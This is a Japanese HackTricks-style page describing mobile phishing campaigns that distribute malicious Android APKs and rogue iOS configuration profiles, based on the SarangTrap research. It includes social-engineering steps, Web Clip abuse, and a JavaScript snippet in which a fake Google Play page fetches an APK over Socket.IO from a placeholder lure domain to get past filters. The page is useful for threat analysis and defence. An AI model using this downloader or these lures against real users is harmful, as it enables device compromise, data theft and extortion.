# モバイルフィッシングと悪意あるアプリの配布（Android & iOS）

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> このページでは、脅威アクターがフィッシング（SEO、ソーシャルエンジニアリング、偽ストア、出会い系アプリなど）を通じて**悪意あるAndroid APK**や**iOSモバイル構成プロファイル**を配布する手法を解説します。
> 本記事は、Zimperium zLabsが公開したSarangTrapキャンペーン（2025年）や、その他の公開調査に基づいています。<sup>[[1]](#references)</sup>

## 攻撃フロー

1. **SEO/フィッシングインフラ**
   * 類似ドメインを多数登録する（出会い系、クラウド共有、カーサービスなど）。  
     – Googleで上位表示されるよう、`<title>`要素に現地語のキーワードや絵文字を使用する。  
     – 同じランディングページで、Android（`.apk`）とiOSの両方のインストール手順を掲載する。
2. **初回ダウンロード**
   * Android: *署名なし*、または「サードパーティストア」のAPKへの直接リンク。  
   * iOS: `itms-services://`または悪意ある**mobileconfig**プロファイルへの通常のHTTPSリンク（下記参照）。
3. **Androidのインストール後の動作**
   * C2による実行制御、権限の悪用、dropperの回避、バックグラウンドでの情報収集など、インストール後のマルウェアの動作については、以下の専用Android Malware Post-Exploitationページで解説しています。
4. **iOSへの配布手法**
   * 1つの**モバイル構成プロファイル**で、`PayloadType=com.apple.sharedlicenses`や`com.apple.managedConfiguration`などを要求し、デバイスを「MDM」のような監視下に登録できます。  
   * ソーシャルエンジニアリングの手順:
     1. 「設定」➜ *プロファイルがダウンロードされました* を開く。
     2. *インストール*を3回タップする（フィッシングページにスクリーンショットを掲載）。  
     3. 署名なしプロファイルを信頼する ➜ 攻撃者はApp Storeの審査を経ずに*連絡先*と*写真*へのentitlementを得る。
5. **iOS Web Clipペイロード（フィッシングアプリのアイコン）**
   * `com.apple.webClip.managed`ペイロードは、ブランド化されたアイコンとラベルでフィッシングURLを**ホーム画面に固定**できます。
   * Web Clipは**フルスクリーン**で実行でき（ブラウザーUIを隠す）、**削除不可**に設定することもできます。その場合、アイコンを削除するには被害者がプロファイルを削除する必要があります。<sup>[[3]](#references)</sup>
6. **ネットワーク層**
   * 平文HTTP。多くの場合、`api.<phishingdomain>.com`のようなHOSTヘッダーを付けてポート80を使用。
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（TLSなし → 簡単に検出可能）。

## Android Malware Post-Exploitation

C2、Accessibilityの悪用、オーバーレイ、ATSの自動化、段階的なDEX読み込み、プレミアムSMS、永続化など、Androidマルウェアのインストール後のtradecraftについては、以下を参照してください。

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocketを使ったAPKの密輸と偽Google Playページ

攻撃者は、静的なAPKリンクを、Google Play風の誘導ページに埋め込まれたSocket.IO/WebSocketチャネルに置き換えるケースを増やしています。これにより、ペイロードURLを隠し、URLや拡張子のフィルターを回避しながら、実際のインストール画面のような操作感を維持できます。<sup>[[2]](#references)[[4]](#references)</sup>

実環境で確認された一般的なクライアントのフロー:

<details>
<summary>Socket.IOを使った偽Playダウンローダー（JavaScript）</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

単純な制御を回避できる理由:
- 静的なAPK URLは公開されず、WebSocketフレームからメモリ上でpayloadが再構築されます。
- 直接の .apk レスポンスをブロックするURL/MIME/拡張子フィルターでは、WebSocket/Socket.IO経由でトンネルされたバイナリデータを見逃す場合があります。
- WebSocketを実行しないクローラーやURLサンドボックスは、payloadを取得できません。

WebSocketの手法とツールについては、こちらも参照してください:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [ロマンスの暗黒面: SarangTrapによる恐喝キャンペーン](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Appleデバイス向けWeb Clipsのpayload設定](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [インドネシアとベトナムのAndroidユーザーを標的とするバンカートロイの木馬](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
